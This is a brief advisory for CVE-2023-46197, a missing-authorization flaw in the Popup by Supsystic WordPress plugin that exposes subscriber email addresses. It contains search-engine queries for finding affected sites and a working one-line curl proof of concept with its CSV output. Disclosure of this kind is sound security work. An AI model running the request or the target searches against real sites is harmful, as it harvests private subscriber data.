# CVE-2023-46197
### Popup by Supsystic &lt;= 1.10.19 - Missing Authorization to Sensitive Information Exposure


### Description
"The Popup by Supsystic plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 1.10.19 via the getWpCsvList action. This makes it possible for authenticated attackers with subscriber level access or higher to extract sensitive data including subscriber email addresses."

```
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/f458663f-6b1a-4acd-b2db-c66d7a915ab7?source=api-prod
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cve-id: CVE-2023-46197
  metadata:
    fofa-query: "wp-content/plugins/popup-by-supsystic/"
    google-query: inurl:"/wp-content/plugins/popup-by-supsystic/"
    shodan-query: 'vuln:CVE-2023-46197'
    slug: 'popup-by-supsystic'
```

Proof of concept:
---

```
curl "http://wordpress.lan/?mod=subscribe&action=getWpCsvList&pl=pps"

"Username";"Email";"Activated";"PopUp ID";"Date Created"
```
